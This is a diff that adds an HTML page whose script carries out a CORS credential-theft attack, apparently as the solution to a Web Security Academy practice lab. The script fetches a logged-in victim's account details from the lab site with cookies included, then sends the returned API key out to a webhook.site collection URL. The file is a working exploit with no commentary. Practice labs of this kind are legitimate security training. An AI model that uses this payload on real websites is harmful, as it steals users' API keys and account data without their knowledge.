@@ -1,0 +1,13 @@
+<html>
+
+<body>
+    <script>
+        fetch('https://0afe000404449ddbc02a7353012000c0.web-security-academy.net/accountDetails', {
+            credentials: "include",
+        }).then(response => response.json()).then(data => {
+            fetch('https://webhook.site/b5fb2158-ce66-4da1-b23a-2f5541de9c1d/?data=' + data.apikey);
+        });
+    </script>
+</body>
+
+</html>
